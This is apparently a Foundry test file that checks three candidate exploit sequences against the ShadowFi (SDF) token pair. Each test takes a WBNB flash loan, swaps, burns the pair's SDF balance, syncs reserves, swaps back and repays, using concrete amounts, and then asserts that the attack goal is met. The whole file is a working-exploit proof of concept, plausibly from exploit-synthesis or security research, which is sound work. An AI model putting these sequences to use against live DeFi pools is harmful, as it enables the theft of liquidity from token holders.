// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./ShadowFi.t.sol";

contract ShadowFiVerify is ShadowFiTest {
    function test_verify_cand002_0() public {
        uint256 amt0 = 0x187c71808100000401000;
        uint256 amt1 = 0xffe3ffe8ff7fff202806;
        uint256 amt2 = 0x2487d1efc17514;
        uint256 amt3 = 0x40001fb39f39;
        uint256 amt4 = 0x187c718082b48eb97f000;
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        require(attackGoal(), "Attack failed!");
    }

    function test_verify_cand002_1() public {
        uint256 amt0 = 0x16d400084001a85a82000;
        uint256 amt1 = 0xffe021f0000000000000;
        uint256 amt2 = 0x4dc8dfd39cdf;
        uint256 amt3 = 0x2003d0340193;
        uint256 amt4 = 0x16d4000841b6371000000;
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        require(attackGoal(), "Attack failed!");
    }

    function test_verify_cand002_2() public {
        uint256 amt0 = 0x1fff01507ffea754c1d80;
        uint256 amt1 = 0x1ffe99afffffdf8000005;
        uint256 amt2 = 0x6ca000f1adc48;
        uint256 amt3 = 0x12ff8973f59;
        uint256 amt4 = 0x1fff015081b3360a3fd80;
        borrow_wbnb(amt0);
        swap_pair_wbnb_sdf(amt1);
        burn_pair_sdf(amt2);
        sync_pair();
        swap_pair_sdf_wbnb(amt3);
        payback_wbnb(amt4);
        require(attackGoal(), "Attack failed!");
    }
}
